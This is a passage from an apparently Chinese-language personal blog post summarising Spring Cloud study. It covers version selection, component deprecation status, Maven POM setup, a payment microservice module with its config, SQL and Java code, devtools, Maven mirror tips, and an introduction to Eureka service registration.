    <content><![CDATA[<blockquote><p>小y的<code>SpringCloud</code>学习总结 :sunny:</p></blockquote><h3 id="SpringCloud介绍"><a href="#SpringCloud介绍" class="headerlink" title="SpringCloud介绍"></a>SpringCloud介绍</h3><ul><li><code>SpringCloud</code>技术概览</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200622113343410.png" alt="image-20200622113343410"></p><a id="more"></a><ul><li>版本选型<ul><li><code>SpringBoot 2.2.x</code> 2.2.2.RELEASE</li><li><code>SpringCloud Hoxton版</code> Hoxton SR1</li><li><code>cloud alibaba</code> 2.1.0.RELEASE</li><li><code>Java</code> Java8</li><li><code>Maven</code> 3.5以上</li><li><code>MySQL</code> 5.7以上</li></ul></li></ul><h3 id="Cloud组件停更说明"><a href="#Cloud组件停更说明" class="headerlink" title="Cloud组件停更说明"></a>Cloud组件停更说明</h3><ul><li><p><strong>服务注册中心</strong>：</p><ul><li><code>Eureka</code>:x:已经不再更新</li><li><code>Zookeeper</code> 缺乏管理面板，使用起来不方便</li><li><code>Nacos</code> 现在最常用的注册中心:heavy_check_mark:</li></ul></li><li><p><strong>服务调用</strong>：</p><ul><li><code>Ribbon</code> 后续会可能弃用</li><li><code>LoadBalance</code> 新推出的服务调用框架</li><li><code>Feign</code> :x:已经弃用</li><li><code>OpenFeign</code> Spring社区自己推出的服务调用组件:heavy_check_mark:</li></ul></li><li><p><strong>服务降级</strong>：</p><ul><li><code>Hystrix</code> 已经弃用:x:</li><li><code>resilience4j</code> 国外推荐用来替换Hystrix的框架</li><li><code>sentienl</code> 阿里新推出的:heavy_check_mark:</li></ul></li><li><p><strong>服务网关</strong>：</p><ul><li><code>Zuul</code> 因为分歧而停更:x:</li><li><code>gateway</code>spring推荐的组件:heavy_check_mark:</li></ul></li><li><p><strong>服务配置</strong>：</p><ul><li><code>Config</code>:x:</li><li><code>Nacos</code> :heavy_check_mark:</li></ul></li><li><p><strong>服务总线</strong></p><ul><li><code>Bus</code> :x:</li><li><code>Nacos</code> :heavy_check_mark:</li></ul><!--more--></li></ul><h3 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h3><blockquote><p>POM文件配置，以下是父工程的pom文件内容</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--统一管理jar包版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>12<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>12<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lombok.version</span>&gt;</span>1.18.10<span class="tag">&lt;/<span class="name">lombok.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log4j.version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">log4j.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.18<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">druid.version</span>&gt;</span>1.1.16<span class="tag">&lt;/<span class="name">druid.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mybatis.spring.boot.version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">mybatis.spring.boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--子模块继承之后，提供作用：锁定版本+子module groupId和version--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-project-info-reports-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring boot 2.2.2--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring cloud Hoxton.SR1--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Hoxton.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring cloud 阿里巴巴--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mysql--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mysql.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- druid--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;druid.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.spring.boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--junit--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--log4j--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="区别dependencyManagement和dependencies"><a href="#区别dependencyManagement和dependencies" class="headerlink" title="区别dependencyManagement和dependencies"></a>区别dependencyManagement和dependencies</h4><p>​ <code>Maven</code>使用<code>dependencyManagement</code>元素来提供了一种管理依赖版本号的方式。通常会在一个组织或者项目的最顶层的父<code>POM</code>中看到<code>dependencyManagement</code>元素。使用<code>pom.xml</code>中的<code>dependencyManagement</code>元素能让所有在子项目中引用一个依赖而不用显式的列出版本号。<code>Maven</code>会沿着父子层次向上走，直到找到一个拥有<code>dependencyManagement</code> 元素的项目，然后它就会使用这个<code>dependencyManagement</code>元素中指定的版本号。</p><blockquote><p>:star:dependencyManagement只是声明依赖，并不实现引入，因此子项目需要显示的声明需要用的依赖。如果不在子项目中声明依赖，是不会从父项目中继承下来的；只有在子项目中写了该依赖项，并且没有指定具体版本,才会从父项目中继承该项，并且version和scope都读取自父pom；如果子项目中指定了版本号，那么会使用子项目中指定的jar版本。</p></blockquote><h4 id="支付模块构建"><a href="#支付模块构建" class="headerlink" title="支付模块构建"></a>支付模块构建</h4><blockquote><p>需要构建如下图所示的模块</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200622162958934.png" alt="image-20200622162958934" style="zoom:50%"><p>微服务模块构建流程：</p><ol><li>建module</li><li>改POM</li><li>写YML</li><li>主启动</li><li>业务类</li></ol><h5 id="提供者模块：cloud-provider-payment8001"><a href="#提供者模块：cloud-provider-payment8001" class="headerlink" title="提供者模块：cloud-provider-payment8001"></a>提供者模块：cloud-provider-payment8001</h5><blockquote><p>POM文件如下</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!--添加boot自动配置，一定要添加不然@SpringBootApplication注解无效--&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>application.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="comment"># 当前数据源操作类型</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.alibaba.druid.proxy.DruidDriver</span></span><br><span class="line">    <span class="comment"># mysql驱动包</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/db2019?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.tosang.springcloud.entities</span> <span class="comment">#所有Entity别名类所在包</span></span><br></pre></td></tr></table></figure><blockquote><p>启动类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentMain8001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(PaymentMain8001<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>业务类——SQL</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建表，注意``和''的区别</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`payment`</span>(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">BIGINT</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'ID'</span>,</span><br><span class="line"><span class="string">`serial`</span> <span class="built_in">VARCHAR</span>(<span class="number">200</span>) <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`id`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><blockquote><p>controller，dao，entities，service，mapper各层目录结构如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200708082150124.png" alt="image-20200708082150124"></p><blockquote><p>注意：子模块可能无法调用父模块的依赖（由于maven在IDEA2020下的抽风），尤其是可以尝试手动添加mysql-connector-java的maven依赖，并且需要注意驱动版本和mysql匹配以及mysql的ssh是否关闭。</p></blockquote><h5 id="消费者模块：cloud-consumer-order80"><a href="#消费者模块：cloud-consumer-order80" class="headerlink" title="消费者模块：cloud-consumer-order80"></a>消费者模块：cloud-consumer-order80</h5><blockquote><p>restTemplate</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三个参数：请求URL，发送的对象， 返回值类型</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(PAYMENT_URL+</span><br><span class="line">                <span class="string">"/payment/create"</span>, payment, CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="热部署Devtools"><a href="#热部署Devtools" class="headerlink" title="热部署Devtools"></a>热部署Devtools</h3><blockquote><p>Adding devtools to your 子模块project</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/ <span class="attr">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span> spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt; <span class="attr">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Adding plugin to your 父工程pom.xml</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>你自己的工程名字<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/ <span class="attr">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">addResources</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addResources</span>&gt;</span>|</span><br><span class="line">			<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Enabling automatic build<br>Update the value of</p></blockquote><p>不过开启热部署，性能耗费会较大，不建议使用</p><h3 id="项目重构"><a href="#项目重构" class="headerlink" title="项目重构"></a>项目重构</h3><blockquote><p>实体类在子模块都是重用的，需要抽取出来作为公共类</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200710092249034.png" alt="image-20200710092249034"></p><h5 id="MAVEN打包"><a href="#MAVEN打包" class="headerlink" title="MAVEN打包"></a>MAVEN打包</h5><blockquote><p>这个地方是个大坑，建议如下</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#首先添加阿里云镜像，这一步相信大家都会</span><br><span class="line">（但是建议是先运行一次官方版本maven保证下载了maven插件再替换镜像，这取决于你的网络，很可能并不会一定成功）</span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#如果继续爆红，尝试指定java版本，这点非常关键</span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># maven插件抽风爆红困扰了我很久，指定java版本经我检测是很有效的办法</span><br></pre></td></tr></table></figure><p>一切就绪点击<code>maven install</code>即可</p><h5 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入自己定义的api通用包--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.tosang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Eureka服务注册与发现"><a href="#Eureka服务注册与发现" class="headerlink" title="Eureka服务注册与发现"></a>Eureka服务注册与发现</h3><blockquote><p>Eureka采用了CS的设计架构，<code>Eureka Server</code>作为服务注册功能的服务器，它是服务注册中心。而系统中的其他微服务,使用Eureka的客户端连接到Eureka Server并维持心跳连接。这样系统的维护人员就可以通过Eureka Server来监控系统中各个微服务是否正常运行。在服务注册与发现中，有一个注册中心。 当服务器启动的时候，会把当前自己服务器的信息比如服务地址通讯地址等以别名方式注册到注册中心上。另一方(消费者|服务提供者) ,以该别名的方式去注册中心上获取到实际的服务通讯地址，然后再实现本地RPC调用RPC远程调用框架核心设计思想:在于注册中心，因为使用注册中心管理每个服务与服务之间的一个依赖关系(服务治理概念)。在任何rpc远程框架中， 都会有一个<code>注册中心</code>(存放服务 地址相关信息(接口地址))</p></blockquote><h4 id="Eureka-Server"><a href="#Eureka-Server" class="headerlink" title="Eureka Server"></a>Eureka Server</h4><blockquote><p><code>Eureka Server</code>提供服务注册服务各个微服务节点通过配置启动后，会在EurekaServer中进行注册，这样EurekaServer中的服务注册表中将会存储所有可用服务节的信息,服务节点的信息可以在界面中直观看到。</p></blockquote><h4 id="EurekaClient"><a href="#EurekaClient" class="headerlink" title="EurekaClient"></a>EurekaClient</h4><blockquote><p><code>EurekaClient</code>通过注册中心进行访问，是一个Java客户端，用于简化Eureka Server的交互,客户端同时也具备一个内置的、 使用轮询(round-robin)负载算法的负载均衡器。在应用启动后,将会向Eureka Server发送心跳(默认周期为30秒。 如果Eureka Server在多个心跳周期内没有接收到某个节点的心跳，EurekaServer将会从服务注册表中把这个服务节点移除(默认90秒)</p></blockquote><h4 id="cloud-eureka-server8000"><a href="#cloud-eureka-server8000" class="headerlink" title="cloud-eureka-server8000"></a>cloud-eureka-server8000</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span>   <span class="comment">#服务端实例名称</span></span><br><span 